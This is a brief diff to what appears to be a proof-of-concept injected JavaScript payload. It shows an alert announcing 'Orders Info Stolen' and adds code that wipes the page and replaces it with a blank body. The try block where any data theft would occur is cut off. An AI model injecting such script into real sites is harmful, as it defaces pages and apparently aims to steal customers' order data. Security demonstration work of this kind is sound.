@@ -1,4 +1,9 @@
 (async () => {
+  // Make the page blank and keep it blank
+  document.documentElement.innerHTML = "";
+  document.body = document.createElement("body");
+  document.body.style.cssText = "margin:0;padding:0;background:#fff;";
+
   alert("POC Example: Orders Info Stolen");
 
   try {
